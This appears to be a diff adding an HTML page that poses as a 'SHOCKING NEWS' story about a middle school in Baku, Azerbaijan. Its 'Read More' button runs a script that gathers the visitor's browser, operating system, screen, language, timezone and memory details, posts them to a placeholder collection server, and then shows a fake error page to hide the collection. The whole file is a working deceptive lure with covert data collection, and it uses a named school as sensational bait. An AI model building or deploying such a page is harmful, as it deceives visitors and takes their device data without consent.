@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>141 Middle School in Baku, Azerbaijan - SHOCKING NEWS</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      padding: 20px;
+      color: #333;
+    }
+    h1 {
+      color: red;
+      text-align: center;
+    }
+    p {
+      text-align: center;
+      font-size: 18px;
+    }
+    button {
+      display: block;
+      margin: 20px auto;
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #ff4d4d;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .error-page {
+      text-align: center;
+      font-size: 24px;
+      color: red;
+      margin-top: 50px;
+    }
+  </style>
+</head>
+<body>
+  <h1>⚠️ SHOCKING NEWS: 141 MIDDLE SCHOOL IN BAKU, AZERBAIJAN ⚠️</h1>
+  <p>Click below to read the full story about the shocking events at the school.</p>
+  <button onclick="collectDeviceInfo()">Read More</button>
+
+  <script>
+    function collectDeviceInfo() {
+      const info = {
+        browser: navigator.userAgent,
+        platform: navigator.platform,
+        os: navigator.oscpu,
+        screenResolution: screen.width + "x" + screen.height,
+        colorDepth: screen.colorDepth,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        deviceMemory: navigator.deviceMemory
+      };
+
+      // Send the data to your server (you can replace this URL with your own)
+      fetch("https://yourserver.com/collect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(info)
+      });
+
+      // Show fake error page
+      document.body.innerHTML = `
+        <div class="error-page">
+          <h1>⚠️ Oops! Something went wrong ⚠️</h1>
+          <p>The link is not working. Try again later.</p>
+        </div>
+      `;
+    }
+  </script>
+</body>
+</html>
